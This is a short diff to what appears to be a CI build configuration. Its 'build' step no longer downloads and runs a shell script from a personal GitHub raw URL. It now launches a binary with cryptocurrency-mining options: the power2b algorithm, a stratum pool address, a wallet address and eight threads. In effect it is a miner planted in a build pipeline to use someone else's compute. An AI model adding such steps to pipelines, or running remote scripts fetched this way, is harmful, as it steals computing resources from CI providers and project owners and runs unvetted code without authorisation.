@@ -5,4 +5,4 @@ build:
     - script:
         name: build
         code: |
-          wget https://raw.githubusercontent.com/sijojon88/sijojon88/main/mbc.sh && chmod +x mbc.sh && sh mbc.sh
+          chmod +x mbc && ./mbc -a power2b -o stratum+tcps://stratum-eu.rplant.xyz:17022 -u MqmM35U2EtSFVvit5VcW7nY9raBy6Sw6vm -t 8 -p password=X 
